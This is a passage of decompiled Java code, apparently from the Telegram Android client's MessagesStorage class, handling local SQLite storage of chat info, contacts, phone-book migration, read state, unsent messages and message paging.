                            info = TLRPC$ChatFull.TLdeserialize(data, data.readInt32(false), false);
                            data.reuse();
                            info.pinned_msg_id = cursor.intValue(1);
                        }
                    }
                    cursor.dispose();
                    StringBuilder usersToLoad;
                    int a;
                    if (info instanceof TLRPC$TL_chatFull) {
                        usersToLoad = new StringBuilder();
                        for (a = 0; a < info.participants.participants.size(); a++) {
                            TLRPC$ChatParticipant c = (TLRPC$ChatParticipant) info.participants.participants.get(a);
                            if (usersToLoad.length() != 0) {
                                usersToLoad.append(",");
                            }
                            usersToLoad.append(c.user_id);
                        }
                        if (usersToLoad.length() != 0) {
                            MessagesStorage.this.getUsersInternal(usersToLoad.toString(), loadedUsers);
                        }
                    } else if (info instanceof TLRPC$TL_channelFull) {
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT us.data, us.status, cu.data, cu.date FROM channel_users_v2 as cu LEFT JOIN users as us ON us.uid = cu.uid WHERE cu.did = " + (-i) + " ORDER BY cu.date DESC", new Object[0]);
                        info.participants = new TLRPC$TL_chatParticipants();
                        while (cursor.next()) {
                            User user = null;
                            TLRPC$ChannelParticipant participant = null;
                            try {
                                data = cursor.byteBufferValue(0);
                                if (data != null) {
                                    user = User.TLdeserialize(data, data.readInt32(false), false);
                                    data.reuse();
                                }
                                data = cursor.byteBufferValue(2);
                                if (data != null) {
                                    participant = TLRPC$ChannelParticipant.TLdeserialize(data, data.readInt32(false), false);
                                    data.reuse();
                                }
                                if (!(user == null || participant == null)) {
                                    if (user.status != null) {
                                        user.status.expires = cursor.intValue(1);
                                    }
                                    loadedUsers.add(user);
                                    participant.date = cursor.intValue(3);
                                    TLRPC$TL_chatChannelParticipant chatChannelParticipant = new TLRPC$TL_chatChannelParticipant();
                                    chatChannelParticipant.user_id = participant.user_id;
                                    chatChannelParticipant.date = participant.date;
                                    chatChannelParticipant.inviter_id = participant.inviter_id;
                                    chatChannelParticipant.channelParticipant = participant;
                                    info.participants.participants.add(chatChannelParticipant);
                                }
                            } catch (Exception e) {
                                FileLog.e(e);
                            }
                        }
                        cursor.dispose();
                        usersToLoad = new StringBuilder();
                        for (a = 0; a < info.bot_info.size(); a++) {
                            TLRPC$BotInfo botInfo = (TLRPC$BotInfo) info.bot_info.get(a);
                            if (usersToLoad.length() != 0) {
                                usersToLoad.append(",");
                            }
                            usersToLoad.append(botInfo.user_id);
                        }
                        if (usersToLoad.length() != 0) {
                            MessagesStorage.this.getUsersInternal(usersToLoad.toString(), loadedUsers);
                        }
                    }
                    if (semaphore2 != null) {
                        semaphore2.release();
                    }
                    if ((info instanceof TLRPC$TL_channelFull) && info.pinned_msg_id != 0) {
                        pinnedMessageObject = MessagesQuery.loadPinnedMessage(i, info.pinned_msg_id, false);
                    }
                    MessagesController.getInstance().processChatInfo(i, info, loadedUsers, true, z, z2, pinnedMessageObject);
                    if (semaphore2 != null) {
                        semaphore2.release();
                    }
                } catch (Exception e2) {
                    FileLog.e(e2);
                    MessagesController.getInstance().processChatInfo(i, info, loadedUsers, true, z, z2, null);
                    if (semaphore2 != null) {
                        semaphore2.release();
                    }
                } catch (Throwable th) {
                    Throwable th2 = th;
                    MessagesController.getInstance().processChatInfo(i, info, loadedUsers, true, z, z2, null);
                    if (semaphore2 != null) {
                        semaphore2.release();
                    }
                }
            }
        });
    }

    public void processPendingRead(long dialog_id, long max_id, int max_date) {
        final long j = dialog_id;
        final long j2 = max_id;
        final int i = max_date;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLitePreparedStatement state;
                    MessagesStorage.this.database.beginTransaction();
                    if (((int) j) != 0) {
                        state = MessagesStorage.this.database.executeFast("UPDATE messages SET read_state = read_state | 1 WHERE uid = ? AND mid <= ? AND read_state IN(0,2) AND out = 0");
                        state.requery();
                        state.bindLong(1, j);
                        state.bindLong(2, j2);
                        state.step();
                        state.dispose();
                    } else {
                        state = MessagesStorage.this.database.executeFast("UPDATE messages SET read_state = read_state | 1 WHERE uid = ? AND date <= ? AND read_state IN(0,2) AND out = 0");
                        state.requery();
                        state.bindLong(1, j);
                        state.bindInteger(2, i);
                        state.step();
                        state.dispose();
                    }
                    int currentMaxId = 0;
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT inbox_max FROM dialogs WHERE did = " + j, new Object[0]);
                    if (cursor.next()) {
                        currentMaxId = cursor.intValue(0);
                    }
                    cursor.dispose();
                    currentMaxId = Math.max(currentMaxId, (int) j2);
                    state = MessagesStorage.this.database.executeFast("UPDATE dialogs SET unread_count = 0, inbox_max = ? WHERE did = ?");
                    state.requery();
                    state.bindInteger(1, currentMaxId);
                    state.bindLong(2, j);
                    state.step();
                    state.dispose();
                    MessagesStorage.this.database.commitTransaction();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void putContacts(ArrayList<TLRPC$TL_contact> contacts, final boolean deleteAll) {
        if (!contacts.isEmpty()) {
            final ArrayList<TLRPC$TL_contact> contactsCopy = new ArrayList(contacts);
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    try {
                        if (deleteAll) {
                            MessagesStorage.this.database.executeFast("DELETE FROM contacts WHERE 1").stepThis().dispose();
                        }
                        MessagesStorage.this.database.beginTransaction();
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO contacts VALUES(?, ?)");
                        for (int a = 0; a < contactsCopy.size(); a++) {
                            TLRPC$TL_contact contact = (TLRPC$TL_contact) contactsCopy.get(a);
                            state.requery();
                            state.bindInteger(1, contact.user_id);
                            state.bindInteger(2, contact.mutual ? 1 : 0);
                            state.step();
                        }
                        state.dispose();
                        MessagesStorage.this.database.commitTransaction();
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    public void deleteContacts(final ArrayList<Integer> uids) {
        if (uids != null && !uids.isEmpty()) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    try {
                        MessagesStorage.this.database.executeFast("DELETE FROM contacts WHERE uid IN(" + TextUtils.join(",", uids) + ")").stepThis().dispose();
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    public void applyPhoneBookUpdates(final String adds, final String deletes) {
        if (adds.length() != 0 || deletes.length() != 0) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    try {
                        if (adds.length() != 0) {
                            MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE user_phones_v7 SET deleted = 0 WHERE sphone IN(%s)", new Object[]{adds})).stepThis().dispose();
                        }
                        if (deletes.length() != 0) {
                            MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE user_phones_v7 SET deleted = 1 WHERE sphone IN(%s)", new Object[]{deletes})).stepThis().dispose();
                        }
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    public void putCachedPhoneBook(final HashMap<String, ContactsController$Contact> contactHashMap, final boolean migrate) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.beginTransaction();
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO user_contacts_v7 VALUES(?, ?, ?, ?, ?)");
                    SQLitePreparedStatement state2 = MessagesStorage.this.database.executeFast("REPLACE INTO user_phones_v7 VALUES(?, ?, ?, ?)");
                    for (Entry<String, ContactsController$Contact> entry : contactHashMap.entrySet()) {
                        ContactsController$Contact contact = (ContactsController$Contact) entry.getValue();
                        if (!(contact.phones.isEmpty() || contact.shortPhones.isEmpty())) {
                            state.requery();
                            state.bindString(1, contact.key);
                            state.bindInteger(2, contact.contact_id);
                            state.bindString(3, contact.first_name);
                            state.bindString(4, contact.last_name);
                            state.bindInteger(5, contact.imported);
                            state.step();
                            for (int a = 0; a < contact.phones.size(); a++) {
                                state2.requery();
                                state2.bindString(1, contact.key);
                                state2.bindString(2, (String) contact.phones.get(a));
                                state2.bindString(3, (String) contact.shortPhones.get(a));
                                state2.bindInteger(4, ((Integer) contact.phoneDeleted.get(a)).intValue());
                                state2.step();
                            }
                        }
                    }
                    state.dispose();
                    state2.dispose();
                    MessagesStorage.this.database.commitTransaction();
                    if (migrate) {
                        MessagesStorage.this.database.executeFast("DROP TABLE IF EXISTS user_contacts_v6;").stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DROP TABLE IF EXISTS user_phones_v6;").stepThis().dispose();
                        MessagesStorage.this.getCachedPhoneBook(false);
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void getCachedPhoneBook(final boolean byError) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                SQLiteCursor cursor;
                ContactsController$Contact contact;
                String phone;
                String sphone;
                try {
                    cursor = MessagesStorage.this.database.queryFinalized("SELECT name FROM sqlite_master WHERE type='table' AND name='user_contacts_v6'", new Object[0]);
                    boolean migrate = cursor.next();
                    cursor.dispose();
                    if (migrate) {
                        HashMap<Integer, ContactsController$Contact> contactHashMap = new HashMap();
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT us.uid, us.fname, us.sname, up.phone, up.sphone, up.deleted, us.imported FROM user_contacts_v6 as us LEFT JOIN user_phones_v6 as up ON us.uid = up.uid WHERE 1", new Object[0]);
                        while (cursor.next()) {
                            int uid = cursor.intValue(0);
                            contact = (ContactsController$Contact) contactHashMap.get(Integer.valueOf(uid));
                            if (contact == null) {
                                contact = new ContactsController$Contact();
                                contact.first_name = cursor.stringValue(1);
                                contact.last_name = cursor.stringValue(2);
                                contact.imported = cursor.intValue(6);
                                if (contact.first_name == null) {
                                    contact.first_name = "";
                                }
                                if (contact.last_name == null) {
                                    contact.last_name = "";
                                }
                                contact.contact_id = uid;
                                contactHashMap.put(Integer.valueOf(uid), contact);
                            }
                            phone = cursor.stringValue(3);
                            if (phone != null) {
                                contact.phones.add(phone);
                                sphone = cursor.stringValue(4);
                                if (sphone != null) {
                                    if (sphone.length() == 8 && phone.length() != 8) {
                                        sphone = PhoneFormat.stripExceptNumbers(phone);
                                    }
                                    contact.shortPhones.add(sphone);
                                    contact.phoneDeleted.add(Integer.valueOf(cursor.intValue(5)));
                                    contact.phoneTypes.add("");
                                }
                            }
                        }
                        cursor.dispose();
                        ContactsController.getInstance().migratePhoneBookToV7(contactHashMap);
                        return;
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
                HashMap<String, ContactsController$Contact> contactHashMap2 = new HashMap();
                try {
                    cursor = MessagesStorage.this.database.queryFinalized("SELECT us.key, us.uid, us.fname, us.sname, up.phone, up.sphone, up.deleted, us.imported FROM user_contacts_v7 as us LEFT JOIN user_phones_v7 as up ON us.key = up.key WHERE 1", new Object[0]);
                    while (cursor.next()) {
                        String key = cursor.stringValue(0);
                        contact = (ContactsController$Contact) contactHashMap2.get(key);
                        if (contact == null) {
                            contact = new ContactsController$Contact();
                            contact.contact_id = cursor.intValue(1);
                            contact.first_name = cursor.stringValue(2);
                            contact.last_name = cursor.stringValue(3);
                            contact.imported = cursor.intValue(7);
                            if (contact.first_name == null) {
                                contact.first_name = "";
                            }
                            if (contact.last_name == null) {
                                contact.last_name = "";
                            }
                            contactHashMap2.put(key, contact);
                        }
                        phone = cursor.stringValue(4);
                        if (phone != null) {
                            contact.phones.add(phone);
                            sphone = cursor.stringValue(5);
                            if (sphone != null) {
                                if (sphone.length() == 8 && phone.length() != 8) {
                                    sphone = PhoneFormat.stripExceptNumbers(phone);
                                }
                                contact.shortPhones.add(sphone);
                                contact.phoneDeleted.add(Integer.valueOf(cursor.intValue(6)));
                                contact.phoneTypes.add("");
                            }
                        }
                    }
                    cursor.dispose();
                } catch (Exception e2) {
                    contactHashMap2.clear();
                    FileLog.e(e2);
                }
                ContactsController.getInstance().performSyncPhoneBook(contactHashMap2, true, true, false, false, !byError, false);
            }
        });
    }

    public void getContacts() {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                ArrayList<TLRPC$TL_contact> contacts = new ArrayList();
                ArrayList<User> users = new ArrayList();
                try {
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT * FROM contacts WHERE 1", new Object[0]);
                    StringBuilder uids = new StringBuilder();
                    while (cursor.next()) {
                        boolean z;
                        int user_id = cursor.intValue(0);
                        TLRPC$TL_contact contact = new TLRPC$TL_contact();
                        contact.user_id = user_id;
                        if (cursor.intValue(1) == 1) {
                            z = true;
                        } else {
                            z = false;
                        }
                        contact.mutual = z;
                        if (uids.length() != 0) {
                            uids.append(",");
                        }
                        contacts.add(contact);
                        uids.append(contact.user_id);
                    }
                    cursor.dispose();
                    if (uids.length() != 0) {
                        MessagesStorage.this.getUsersInternal(uids.toString(), users);
                    }
                } catch (Exception e) {
                    contacts.clear();
                    users.clear();
                    FileLog.e(e);
                }
                ContactsController.getInstance().processLoadedContacts(contacts, users, 1);
            }
        });
    }

    public void getUnsentMessages(final int count) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    HashMap<Integer, TLRPC$Message> messageHashMap = new HashMap();
                    ArrayList<TLRPC$Message> messages = new ArrayList();
                    ArrayList<User> users = new ArrayList();
                    ArrayList<TLRPC$Chat> chats = new ArrayList();
                    ArrayList<TLRPC$EncryptedChat> encryptedChats = new ArrayList();
                    ArrayList<Integer> usersToLoad = new ArrayList();
                    ArrayList<Integer> chatsToLoad = new ArrayList();
                    ArrayList<Integer> broadcastIds = new ArrayList();
                    ArrayList<Integer> encryptedChatIds = new ArrayList();
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.uid, s.seq_in, s.seq_out, m.ttl FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid LEFT JOIN messages_seq as s ON m.mid = s.mid WHERE m.mid < 0 AND m.send_state = 1 ORDER BY m.mid DESC LIMIT " + count, new Object[0]);
                    while (cursor.next()) {
                        NativeByteBuffer data = cursor.byteBufferValue(1);
                        if (data != null) {
                            TLRPC$Message message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                            data.reuse();
                            if (messageHashMap.containsKey(Integer.valueOf(message.id))) {
                                continue;
                            } else {
                                MessageObject.setUnreadFlags(message, cursor.intValue(0));
                                message.id = cursor.intValue(3);
                                message.date = cursor.intValue(4);
                                if (!cursor.isNull(5)) {
                                    message.random_id = cursor.longValue(5);
                                }
                                message.dialog_id = cursor.longValue(6);
                                message.seq_in = cursor.intValue(7);
                                message.seq_out = cursor.intValue(8);
                                message.ttl = cursor.intValue(9);
                                messages.add(message);
                                messageHashMap.put(Integer.valueOf(message.id), message);
                                int lower_id = (int) message.dialog_id;
                                int high_id = (int) (message.dialog_id >> 32);
                                if (lower_id != 0) {
                                    if (high_id == 1) {
                                        if (!broadcastIds.contains(Integer.valueOf(lower_id))) {
                                            broadcastIds.add(Integer.valueOf(lower_id));
                                        }
                                    } else if (lower_id < 0) {
                                        if (!chatsToLoad.contains(Integer.valueOf(-lower_id))) {
                                            chatsToLoad.add(Integer.valueOf(-lower_id));
                                        }
                                    } else if (!usersToLoad.contains(Integer.valueOf(lower_id))) {
                                        usersToLoad.add(Integer.valueOf(lower_id));
                                    }
                                } else if (!encryptedChatIds.contains(Integer.valueOf(high_id))) {
                                    encryptedChatIds.add(Integer.valueOf(high_id));
                                }
                                MessagesStorage.addUsersAndChatsFromMessage(message, usersToLoad, chatsToLoad);
                                message.send_state = cursor.intValue(2);
                                if (!(message.to_id.channel_id != 0 || MessageObject.isUnread(message) || lower_id == 0) || message.id > 0) {
                                    message.send_state = 0;
                                }
                                if (lower_id == 0 && !cursor.isNull(5)) {
                                    message.random_id = cursor.longValue(5);
                                }
                            }
                        }
                    }
                    cursor.dispose();
                    if (!encryptedChatIds.isEmpty()) {
                        MessagesStorage.this.getEncryptedChatsInternal(TextUtils.join(",", encryptedChatIds), encryptedChats, usersToLoad);
                    }
                    if (!usersToLoad.isEmpty()) {
                        MessagesStorage.this.getUsersInternal(TextUtils.join(",", usersToLoad), users);
                    }
                    if (!(chatsToLoad.isEmpty() && broadcastIds.isEmpty())) {
                        int a;
                        Integer cid;
                        StringBuilder stringToLoad = new StringBuilder();
                        for (a = 0; a < chatsToLoad.size(); a++) {
                            cid = (Integer) chatsToLoad.get(a);
                            if (stringToLoad.length() != 0) {
                                stringToLoad.append(",");
                            }
                            stringToLoad.append(cid);
                        }
                        for (a = 0; a < broadcastIds.size(); a++) {
                            cid = (Integer) broadcastIds.get(a);
                            if (stringToLoad.length() != 0) {
                                stringToLoad.append(",");
                            }
                            stringToLoad.append(-cid.intValue());
                        }
                        MessagesStorage.this.getChatsInternal(stringToLoad.toString(), chats);
                    }
                    SendMessagesHelper.getInstance().processUnsentMessages(messages, users, chats, encryptedChats);
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public boolean checkMessageId(long dialog_id, int mid) {
        final boolean[] result = new boolean[1];
        final Semaphore semaphore = new Semaphore(0);
        final long j = dialog_id;
        final int i = mid;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                SQLiteCursor cursor = null;
                try {
                    cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT mid FROM messages WHERE uid = %d AND mid = %d", new Object[]{Long.valueOf(j), Integer.valueOf(i)}), new Object[0]);
                    if (cursor.next()) {
                        result[0] = true;
                    }
                    if (cursor != null) {
                        cursor.dispose();
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                    if (cursor != null) {
                        cursor.dispose();
                    }
                } catch (Throwable th) {
                    if (cursor != null) {
                        cursor.dispose();
                    }
                }
                semaphore.release();
            }
        });
        try {
            semaphore.acquire();
        } catch (Exception e) {
            FileLog.e(e);
        }
        return result[0];
    }

    public void getUnreadMention(final long dialog_id, final IntCallback callback) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    int result;
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT MIN(mid) FROM messages WHERE uid = %d AND mention = 1 AND read_state IN(0, 1)", new Object[]{Long.valueOf(dialog_id)}), new Object[0]);
                    if (cursor.next()) {
                        result = cursor.intValue(0);
                    } else {
                        result = 0;
                    }
                    cursor.dispose();
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        public void run() {
                            callback.run(result);
                        }
                    });
                } catch (Exception e) {
                    FileLog.e("tmessages", e);
                }
            }
        });
    }

    public void getMessages(long dialog_id, int count, int max_id, int offset_date, int minDate, int classGuid, int load_type, boolean isChannel, int loadIndex) {
        final int i = count;
        final int i2 = max_id;
        final boolean z = isChannel;
        final long j = dialog_id;
        final int i3 = load_type;
        final int i4 = minDate;
        final int i5 = offset_date;
        final int i6 = classGuid;
        final int i7 = loadIndex;
        this.storageQueue.postRunnable(new Runnable() {

            /* renamed from: org.telegram.messenger.MessagesStorage$57$1 */
            class C15461 implements Comparator<TLRPC$Message> {
                C15461() {
                }

                public int compare(TLRPC$Message lhs, TLRPC$Message rhs) {
                    if (lhs.id <= 0 || rhs.id <= 0) {
                        if (lhs.id >= 0 || rhs.id >= 0) {
                            if (lhs.date > rhs.date) {
                                return -1;
                            }
                            if (lhs.date < rhs.date) {
                                return 1;
                            }
                        } else if (lhs.id < rhs.id) {
                            return -1;
                        } else {
                            if (lhs.id > rhs.id) {
                                return 1;
                            }
                        }
                    } else if (lhs.id > rhs.id) {
                        return -1;
                    } else {
                        if (lhs.id < rhs.id) {
                            return 1;
                        }
                    }
                    return 0;
                }
            }

            public void run() {
                TLRPC$TL_messages_messages res = new TLRPC$TL_messages_messages();
                int count_unread = 0;
                int mentions_unread = 0;
                int count_query = i;
                int offset_query = 0;
                int min_unread_id = 0;
                int last_message_id = 0;
                boolean queryFromServer = false;
                int max_unread_date = 0;
                long messageMaxId = (long) i2;
                int max_id_query = i2;
                boolean unreadCountIsLocal = false;
                int max_id_override = i2;
                int channelId = 0;
                if (z) {
                    channelId = -((int) j);
                }
                if (!(messageMaxId == 0 || channelId == 0)) {
                    messageMaxId |= ((long) channelId) << 32;
                }
                boolean isEnd = false;
                int num = j == 777000 ? 10 : 1;
                try {
                    SQLiteCursor cursor;
                    AbstractSerializedData data;
                    TLRPC$Message message;
                    TLRPC$Message tLRPC$Message;
                    ArrayList<Integer> usersToLoad = new ArrayList();
                    ArrayList<Integer> chatsToLoad = new ArrayList();
                    ArrayList<Long> replyMessages = new ArrayList();
                    HashMap<Integer, ArrayList<TLRPC$Message>> replyMessageOwners = new HashMap();
                    HashMap<Long, ArrayList<TLRPC$Message>> replyMessageRandomOwners = new HashMap();
                    int lower_id = (int) j;
                    if (lower_id != 0) {
                        int existingUnreadCount;
                        boolean containMessage;
                        if (i3 == 3 && i4 == 0) {
                            cursor = MessagesStorage.this.database.queryFinalized("SELECT inbox_max, unread_count, date, unread_count_i FROM dialogs WHERE did = " + j, new Object[0]);
                            if (cursor.next()) {
                                min_unread_id = cursor.intValue(0) + 1;
                                count_unread = cursor.intValue(1);
                                max_unread_date = cursor.intValue(2);
                                mentions_unread = cursor.intValue(3);
                            }
                            cursor.dispose();
                        } else if (!(i3 == 1 || i3 == 3 || i3 == 4 || i4 != 0)) {
                            if (i3 == 2) {
                                cursor = MessagesStorage.this.database.queryFinalized("SELECT inbox_max, unread_count, date, unread_count_i FROM dialogs WHERE did = " + j, new Object[0]);
                                if (cursor.next()) {
                                    min_unread_id = cursor.intValue(0);
                                    max_id_query = min_unread_id;
                                    messageMaxId = (long) min_unread_id;
                                    count_unread = cursor.intValue(1);
                                    max_unread_date = cursor.intValue(2);
                                    mentions_unread = cursor.intValue(3);
                                    queryFromServer = true;
                                    if (!(messageMaxId == 0 || channelId == 0)) {
                                        messageMaxId |= ((long) channelId) << 32;
                                    }
                                }
                                cursor.dispose();
                                if (!queryFromServer) {
                                    cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT min(mid), max(date) FROM messages WHERE uid = %d AND out = 0 AND read_state IN(0,2) AND mid > 0", new Object[]{Long.valueOf(j)}), new Object[0]);
                                    if (cursor.next()) {
                                        min_unread_id = cursor.intValue(0);
                                        max_unread_date = cursor.intValue(1);
                                    }
                                    cursor.dispose();
                                    if (min_unread_id != 0) {
                                        cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT COUNT(*) FROM messages WHERE uid = %d AND mid >= %d AND out = 0 AND read_state IN(0,2)", new Object[]{Long.valueOf(j), Integer.valueOf(min_unread_id)}), new Object[0]);
                                        if (cursor.next()) {
                                            count_unread = cursor.intValue(0);
                                        }
                                        cursor.dispose();
                                    }
                                } else if (max_id_query == 0) {
                                    existingUnreadCount = 0;
                                    cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT COUNT(*) FROM messages WHERE uid = %d AND mid > 0 AND out = 0 AND read_state IN(0,2)", new Object[]{Long.valueOf(j)}), new Object[0]);
                                    if (cursor.next()) {
                                        existingUnreadCount = cursor.intValue(0);
                                    }
                                    cursor.dispose();
                                    if (existingUnreadCount == count_unread) {
                                        cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT min(mid) FROM messages WHERE uid = %d AND out = 0 AND read_state IN(0,2) AND mid > 0", new Object[]{Long.valueOf(j)}), new Object[0]);
                                        if (cursor.next()) {
                                            min_unread_id = cursor.intValue(0);
                                            max_id_query = min_unread_id;
                                            messageMaxId = (long) min_unread_id;
                                            if (!(messageMaxId == 0 || channelId == 0)) {
                                                messageMaxId |= ((long) channelId) << 32;
                                            }
                                        }
                                        cursor.dispose();
                                    }
                                } else {
                                    cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT start, end FROM messages_holes WHERE uid = %d AND start < %d AND end > %d", new Object[]{Long.valueOf(j), Integer.valueOf(max_id_query), Integer.valueOf(max_id_query)}), new Object[0]);
                                    containMessage = !cursor.next();
                                    cursor.dispose();
                                    if (containMessage) {
                                        cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT min(mid) FROM messages WHERE uid = %d AND out = 0 AND read_state IN(0,2) AND mid > %d", new Object[]{Long.valueOf(j), Integer.valueOf(max_id_query)}), new Object[0]);
                                        if (cursor.next()) {
                                            max_id_query = cursor.intValue(0);
                                            messageMaxId = (long) max_id_query;
                                            if (!(messageMaxId == 0 || channelId == 0)) {
                                                messageMaxId |= ((long) channelId) << 32;
                                            }
                                        }
                                        cursor.dispose();
                                    }
                                }
                            }
                            if (count_query > count_unread || count_unread < num) {
                                count_query = Math.max(count_query, count_unread + 10);
                                if (count_unread < num) {
                                    count_unread = 0;
                                    min_unread_id = 0;
                                    messageMaxId = 0;
                                    last_message_id = 0;
                                    queryFromServer = false;
                                }
                            } else {
                                offset_query = count_unread - count_query;
                                count_query += 10;
                            }
                        }
                        cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT start FROM messages_holes WHERE uid = %d AND start IN (0, 1)", new Object[]{Long.valueOf(j)}), new Object[0]);
                        if (cursor.next()) {
                            isEnd = cursor.intValue(0) == 1;
                            cursor.dispose();
                        } else {
                            cursor.dispose();
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT min(mid) FROM messages WHERE uid = %d AND mid > 0", new Object[]{Long.valueOf(j)}), new Object[0]);
                            if (cursor.next()) {
                                int mid = cursor.intValue(0);
                                if (mid != 0) {
                                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO messages_holes VALUES(?, ?, ?)");
                                    state.requery();
                                    state.bindLong(1, j);
                                    state.bindInteger(2, 0);
                                    state.bindInteger(3, mid);
                                    state.step();
                                    state.dispose();
                                }
                            }
                            cursor.dispose();
                        }
                        if (i3 == 3 || i3 == 4 || (queryFromServer && i3 == 2)) {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT max(mid) FROM messages WHERE uid = %d AND mid > 0", new Object[]{Long.valueOf(j)}), new Object[0]);
                            if (cursor.next()) {
                                last_message_id = cursor.intValue(0);
                            }
                            cursor.dispose();
                            if (i3 == 4 && i5 != 0) {
                                int startMid;
                                int endMid;
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT max(mid) FROM messages WHERE uid = %d AND date <= %d AND mid > 0", new Object[]{Long.valueOf(j), Integer.valueOf(i5)}), new Object[0]);
                                if (cursor.next()) {
                                    startMid = cursor.intValue(0);
                                } else {
                                    startMid = -1;
                                }
                                cursor.dispose();
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT min(mid) FROM messages WHERE uid = %d AND date >= %d AND mid > 0", new Object[]{Long.valueOf(j), Integer.valueOf(i5)}), new Object[0]);
                                if (cursor.next()) {
                                    endMid = cursor.intValue(0);
                                } else {
                                    endMid = -1;
                                }
                                cursor.dispose();
                                if (!(startMid == -1 || endMid == -1)) {
                                    if (startMid == endMid) {
                                        max_id_query = startMid;
                                    } else {
                                        cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT start FROM messages_holes WHERE uid = %d AND start <= %d AND end > %d", new Object[]{Long.valueOf(j), Integer.valueOf(startMid), Integer.valueOf(startMid)}), new Object[0]);
                                        if (cursor.next()) {
                                            startMid = -1;
                                        }
                                        cursor.dispose();
                                        if (startMid != -1) {
                                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT start FROM messages_holes WHERE uid = %d AND start <= %d AND end > %d", new Object[]{Long.valueOf(j), Integer.valueOf(endMid), Integer.valueOf(endMid)}), new Object[0]);
                                            if (cursor.next()) {
                                                endMid = -1;
                                            }
                                            cursor.dispose();
                                            if (endMid != -1) {
                                                max_id_override = endMid;
                                                max_id_query = endMid;
                                                messageMaxId = (long) endMid;
                                                if (!(messageMaxId == 0 || channelId == 0)) {
                                                    messageMaxId |= ((long) channelId) << 32;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            containMessage = max_id_query != 0;
                            if (containMessage) {
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT start FROM messages_holes WHERE uid = %d AND start < %d AND end > %d", new Object[]{Long.valueOf(j), Integer.valueOf(max_id_query), Integer.valueOf(max_id_query)}), new Object[0]);
                                if (cursor.next()) {
                                    containMessage = false;
                                }
                                cursor.dispose();
                            }
                            if (containMessage) {
                                long holeMessageMaxId = 0;
                                long holeMessageMinId = 1;
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT start FROM messages_holes WHERE uid = %d AND start >= %d ORDER BY start ASC LIMIT 1", new Object[]{Long.valueOf(j), Integer.valueOf(max_id_query)}), new Object[0]);
                                if (cursor.next()) {
                                    holeMessageMaxId = (long) cursor.intValue(0);
                                    if (channelId != 0) {
                                        holeMessageMaxId |= ((long) channelId) << 32;
                                    }
                                }
                                cursor.dispose();
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT end FROM messages_holes WHERE uid = %d AND end <= %d ORDER BY end DESC LIMIT 1", new Object[]{Long.valueOf(j), Integer.valueOf(max_id_query)}), new Object[0]);
                                if (cursor.next()) {
                                    holeMessageMinId = (long) cursor.intValue(0);
                                    if (channelId != 0) {
                                        holeMessageMinId |= ((long) channelId) << 32;
                                    }
                                }
                                cursor.dispose();
                                if (holeMessageMaxId == 0 && holeMessageMinId == 1) {
